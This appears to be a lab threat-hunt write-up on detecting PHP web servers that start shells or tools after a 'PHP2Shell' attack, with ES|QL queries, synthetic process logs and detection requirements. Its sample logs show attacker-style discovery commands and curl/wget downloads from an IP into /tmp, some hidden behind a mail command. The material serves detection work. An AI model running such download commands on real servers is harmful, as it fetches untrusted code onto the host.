# H002: PHP web server starting a shell or tool (PHP2Shell)

| | |
|---|---|
| **Data** | `data/synthetic/php_web_events.json` (13 synthetic Linux events, 22 Oct 2026) |
| **Labels used?** | No. The hunt only reads the events file |
| **Run it** | `python -m threathunt_lab hunt --hunt H002` (code: [`hunt_php.py`](../src/threathunt_lab/hunt_php.py)) |
| **Background** | [PHP2Shell research](../docs/php2shell-research.md) |
| **Result** | Activity worth following up on 4 servers. Nothing confirmed as malicious |

## 1. Hypothesis

> If an attacker used PHP2Shell to run commands on one of our Linux web
> servers, a **PHP web server process** (`php-fpm`, `apache2` with mod_php)
> will show up as the **parent** of a shell or a tool like `id`, `uname`,
> `wget` or `curl`, running as the web user (`www-data`).

PHP apps also start programs for normal reasons (sending mail, resizing
images), so a hit is a lead, not proof.

**ATT&CK:** T1190, T1059.004 (Unix Shell), T1033 / T1082 (Discovery),
T1105 (Ingress Tool Transfer).

## 2. Data

Process start events from Linux servers. In a real network this would come
from auditd (`execve`), Sysmon for Linux (event 1) or Elastic Defend.

| Field | Used for |
|---|---|
| `process.parent.name` | Finding web server parents |
| `process.parent.executable` | The parent's path (the detection uses this) |
| `process.name`, `process.executable` | What was started |
| `process.command_line` | What it ran |
| `host.name`, `user.name`, `@timestamp` | Timelines |

The Elastic queries below were **not run on a real cluster**. Change `logs-*`
to your index.

## 3. Investigation

### Q1: Baseline

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start" AND host.os.type == "linux"
| STATS events = COUNT(*) BY host.name, process.name
| SORT events ASC
```

```text
-- Dataset summary
metric                 value
---------------------  ------------------------
events                 13
first @timestamp       2026-10-22T01:00:02.000Z
last @timestamp        2026-10-22T16:30:12.000Z
distinct host.name     4
distinct user.name     3
distinct process.name  6
```

**Notes**
- 13 events from 4 web servers in one day. Far too little to know what's
  "normal".
- `sh` is the most common process (8 of 13). On a web server, that's already
  worth a look.

### Q2: What do web servers start?

Find events whose parent is a web server process. The name is matched by its
start, because PHP-FPM's name includes its version (`php-fpm8.2`).

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start" AND host.os.type == "linux"
| WHERE TO_LOWER(process.parent.name) LIKE ("php-fpm*", "php-cgi*", "apache2*", "httpd*", "frankenphp*", "lsphp*")
| STATS events = COUNT(*) BY host.name, process.parent.name, process.name
| SORT events ASC
```

```text
-- Processes started by web servers (rarest first)
host.name     process.parent.name  process.name  count
------------  -------------------  ------------  -----
web-api-01    php-fpm8.2           curl          1
web-intra-01  php-fpm8.5           sh            1
web-api-01    php-fpm8.2           sh            2
web-blog-01   php-fpm8.4           sh            2
web-shop-01   apache2              sh            2
```

```text
-- Paths and users
event.id      user.name  process.parent.executable  process.executable
------------  ---------  -------------------------  ------------------
php-evt-0005  www-data   /usr/sbin/php-fpm8.4       /usr/bin/dash
php-evt-0006  www-data   /usr/sbin/apache2          /usr/bin/dash
php-evt-0007  www-data   /usr/sbin/php-fpm8.2       /usr/bin/dash
php-evt-0009  www-data   /usr/sbin/php-fpm8.2       /usr/bin/dash
php-evt-0010  www-data   /usr/sbin/php-fpm8.2       /usr/bin/curl
php-evt-0011  www-data   /usr/sbin/apache2          /usr/bin/dash
php-evt-0012  www-data   /usr/sbin/php-fpm8.4       /usr/bin/dash
php-evt-0013  www-data   <missing>                  /usr/bin/dash
```

```text
-- Started by PHP, but not by a web server
event.id      host.name    user.name  process.parent.name  process.name
------------  -----------  ---------  -------------------  ------------
php-evt-0004  web-shop-01  deploy     php8.3               sh
```

**Notes**
- **All 4 servers** have a web server starting processes, all as `www-data`.
- **`curl` started directly by PHP-FPM** (`php-evt-0010`) is the rarest. No
  shell in between, so a rule that only looks for shells would miss it.
- **`sh` is really `/usr/bin/dash`.** On Debian and Ubuntu, `/bin/sh` points
  to dash. The name says `sh`, the path says `dash`. **Lesson: a rule that
  checks the path must include `/dash`.**
- **`php-evt-0013` has no parent path.** Its log source only recorded the
  parent's name. Matching by name still finds it here, but **a rule that needs
  `process.parent.executable` will miss it.**
- **`php-evt-0004`** is PHP started by cron as `deploy` (a command-line
  script, not a web request). Not what we're hunting for.

### Q3: What did they run?

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start" AND host.os.type == "linux"
| WHERE TO_LOWER(process.parent.name) LIKE ("php-fpm*", "php-cgi*", "apache2*", "httpd*", "frankenphp*", "lsphp*")
| KEEP @timestamp, event.id, host.name, process.command_line
| SORT @timestamp ASC
```

```text
-- Command lines started by web servers
event.id      host.name     process.command_line                                                                                 features
------------  ------------  ---------------------------------------------------------------------------------------------------  --------------------------------
php-evt-0005  web-blog-01   sh -c /usr/sbin/sendmail -t -i                                                                       known_good
php-evt-0006  web-shop-01   sh -c convert /var/www/shop/uploads/p1042.jpg -resize 300x300 /var/www/shop/uploads/thumb_p1042.jpg  -
php-evt-0007  web-api-01    sh -c id; uname -a                                                                                   discovery
php-evt-0009  web-api-01    sh -c cd /tmp; wget -q http://198.51.100.77/x.sh                                                     download, tmp_folder, ip_address
php-evt-0010  web-api-01    curl -s -o /tmp/.k http://198.51.100.77/k                                                            download, tmp_folder, ip_address
php-evt-0011  web-shop-01   sh -c uname -a; id                                                                                   discovery
php-evt-0012  web-blog-01   sh -c /usr/sbin/sendmail -t -i; curl -s -o /tmp/m http://198.51.100.77/m                             download, tmp_folder, ip_address
php-evt-0013  web-intra-01  sh -c whoami                                                                                         discovery
```

**Notes**
- **`php-evt-0005`** is exactly what PHP's `mail()` function runs. Normal.
- **`php-evt-0006`** resizes an uploaded image with ImageMagick. Normal for a
  shop, but still a web server running a shell.
- **`php-evt-0007`, `0011`, `0013`**: `id`, `uname -a`, `whoami`. These are
  the "who am I and where am I" commands reported after PHP2Shell attempts.
  A web app has no reason to run them. **Follow up.**
- **`php-evt-0009`, `0010`**: download from a bare IP address into `/tmp`,
  one into a hidden file (`.k`). **Follow up.** (`198.51.100.77` is a
  documentation address.)
- **`php-evt-0012`** starts like the normal mail command, then adds a `curl`
  download. **Lesson: an exclusion must be an exact match**, or attackers can
  hide behind it. **Follow up.**

### Q4: Timeline per server

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start" AND host.name == "web-api-01"
| KEEP @timestamp, event.id, user.name, process.parent.name, process.name, process.command_line
| SORT @timestamp ASC
```

```text
-- Timeline for web-api-01
@timestamp                event.id      user.name  parent -> process   process.command_line
------------------------  ------------  ---------  ------------------  ------------------------------------------------
2026-10-22T13:41:07.000Z  php-evt-0007  www-data   php-fpm8.2 -> sh    sh -c id; uname -a
2026-10-22T13:41:07.100Z  php-evt-0008  www-data   sh -> uname         uname -a
2026-10-22T13:42:30.000Z  php-evt-0009  www-data   php-fpm8.2 -> sh    sh -c cd /tmp; wget -q http://198.51.100.77/x.sh
2026-10-22T13:43:02.000Z  php-evt-0010  www-data   php-fpm8.2 -> curl  curl -s -o /tmp/.k http://198.51.100.77/k
```

```text
-- Timeline for web-shop-01
@timestamp                event.id      user.name  parent -> process   process.command_line
------------------------  ------------  ---------  ------------------  ---------------------------------------------------------------------------------------------------
2026-10-22T01:00:05.000Z  php-evt-0002  root       systemd -> apache2  /usr/sbin/apache2 -k start
2026-10-22T02:00:01.000Z  php-evt-0003  deploy     cron -> php8.3      php /var/www/shop/bin/console cache:clear
2026-10-22T02:00:03.000Z  php-evt-0004  deploy     php8.3 -> sh        sh -c git -C /var/www/shop rev-parse HEAD
2026-10-22T10:02:44.000Z  php-evt-0006  www-data   apache2 -> sh       sh -c convert /var/www/shop/uploads/p1042.jpg -resize 300x300 /var/www/shop/uploads/thumb_p1042.jpg
2026-10-22T14:20:15.000Z  php-evt-0011  www-data   apache2 -> sh       sh -c uname -a; id
```

**Notes**
- **web-api-01** shows the full pattern in 2 minutes: look around (`id`,
  `uname`), then two downloads from the same IP. `php-evt-0008` is `uname`
  started by the shell from `0007`, so it's the same activity. This server
  runs PHP 8.2.20 (vulnerable, see `php-versions`).
- **web-shop-01** has normal activity (cron, image resizing), then `uname -a; id`
  at 14:20. It runs mod_php 8.3.30, the highest-risk setup.
- **web-blog-01** (patched, 8.4.27) still has the fake mail command
  `php-evt-0012`. A patched server can't be hit by PHP2Shell, so this points
  to **something else**, like a vulnerable plugin or an old web shell.
- **web-intra-01** (8.5.10, internal only) has a single `whoami`.

## 4. Findings

| Event | Server | What I saw | Assessment |
|---|---|---|---|
| `php-evt-0007`–`0010` | web-api-01 | Discovery, then downloads from an IP into `/tmp` | **Follow up** (first) |
| `php-evt-0011` | web-shop-01 | `uname -a; id` from mod_php | **Follow up** |
| `php-evt-0012` | web-blog-01 | Download hidden behind the mail command | **Follow up**, probably not PHP2Shell (patched) |
| `php-evt-0013` | web-intra-01 | `whoami` from PHP-FPM | **Follow up** (lower priority, internal) |
| `php-evt-0006` | web-shop-01 | ImageMagick thumbnail | Probably normal: check with the shop's developers |
| `php-evt-0005` | web-blog-01 | PHP mail | Normal |
| `php-evt-0004` | web-shop-01 | Cron PHP script runs `git` | Normal |

"Follow up" is **not** a verdict. Nothing here shows *how* the commands got
started. It could be PHP2Shell, another bug, or a web shell.

## 5. Limitations

- **13 synthetic events** I created.
- **Only process starts.** No web logs (so no exploit request), no file
  events (so no proof of what was downloaded), no network events (so no proof
  the download worked).
- **No process IDs.** `php-evt-0008` is linked to `0007` by time and command
  line only.
- **Attackers who stay inside PHP** or only steal memory start no processes
  and are invisible here.

## 6. What this means for the detection (D002)

- Parent: `php-fpm*`, `php-cgi*`, `apache2`, `httpd`, `frankenphp`, `lsphp`.
  Not plain `php` (that's command-line scripts).
- Child: shells (`sh`, `bash`, **`dash`**) **and** tools started directly
  (`curl`, `wget`, `id`, `uname`, `whoami`, `hostname`).
- Exclude PHP's mail command with an **exact** match.
- Expect alerts from image processing like `php-evt-0006`.
- Without `process.parent.executable` the rule misses events like
  `php-evt-0013`.

The detection is in [D002](../detections/D002-php-web-server-starts-shell.md).
